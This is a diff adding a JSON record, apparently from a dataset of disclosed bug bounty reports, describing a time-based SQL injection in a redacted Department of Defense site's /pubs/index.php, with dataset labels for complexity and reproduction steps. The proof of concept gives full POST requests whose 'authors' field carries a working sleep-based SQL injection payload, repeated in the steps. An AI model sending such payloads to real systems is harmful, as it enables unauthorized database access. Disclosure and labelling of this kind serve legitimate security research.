@@ -1,0 +1,45 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "aziz0x48 ",
+    "title": "Time based SQL injection at\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+    "content": "\nDescription:\nWhile doing test on\u2588\u2588\u2588\u2588\u2588\u2588, I\u2019ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.\nVulnerable parameters are 'years' and 'authors'\nReferences\nPlease check screenshots attached.\nImpact\nTime based SQL injection can lead to the exfiltration of sensitive data from the database.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nPOC\nMake the following POST request to /pubs/index.php\nCode 651 Bytes\n1POST /pubs/index.php HTTP/1.1\n2Host:\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate, br\n7Content-Type: application/x-www-form-urlencoded\n8Content-Length: 68\n9Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pubs/index.php\n11Upgrade-Insecure-Requests: 1\n12Sec-Fetch-Dest: document\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-Site: same-origin\n15Sec-Fetch-User: ?1\n16Te: trailers\n17Connection: close\n18\n19years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'\nNotice that the response time will be 4 seconds.\nCode 652 Bytes\n1POST /pubs/index.php HTTP/1.1\n2Host:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate, br\n7Content-Type: application/x-www-form-urlencoded\n8Content-Length: 68\n9Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10Referer: https://\u2588\u2588\u2588\u2588/pubs/index.php\n11Upgrade-Insecure-Requests: 1\n12Sec-Fetch-Dest: document\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-Site: same-origin\n15Sec-Fetch-User: ?1\n16Te: trailers\n17Connection: close\n18\n19years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'\nNotice that the response time will be 25 seconds.\nThis can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.\nThanks.\nSuggested Mitigation/Remediation Actions\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1706313360,
+    "report_url": "https://hackerone.com/reports/2312334",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a POST request to /pubs/index.php with the 'years' parameter set to a valid year (e.g., 2017) and the 'authors' parameter containing a time-based SQL injection payload like: Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'"
+        ],
+        [
+            2,
+            "Observe the response time. A delayed response (e.g., 4 seconds for sleep(2*2)) confirms the time-based SQL injection vulnerability."
+        ]
+    ],
+    "vuln_description": "The endpoint /pubs/index.php is vulnerable to time-based SQL injection via the 'years' and 'authors' parameters. This allows an attacker to exfiltrate sensitive data from the database by manipulating the response time of the server.",
+    "reason": "The vulnerability involves a straightforward injection of a time-delay payload into a parameter, which is a common and well-documented attack vector. The discovery does not require complex interactions or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating the 'years' and 'authors' parameters in a POST request to trigger time-based delays, which is not related to authentication or authorization boundaries. The proposed methodologies focus on testing access control by swapping user sessions and resource IDs, not on detecting SQL injection vulnerabilities.",
+        "is_detectable": false
+    }
+}
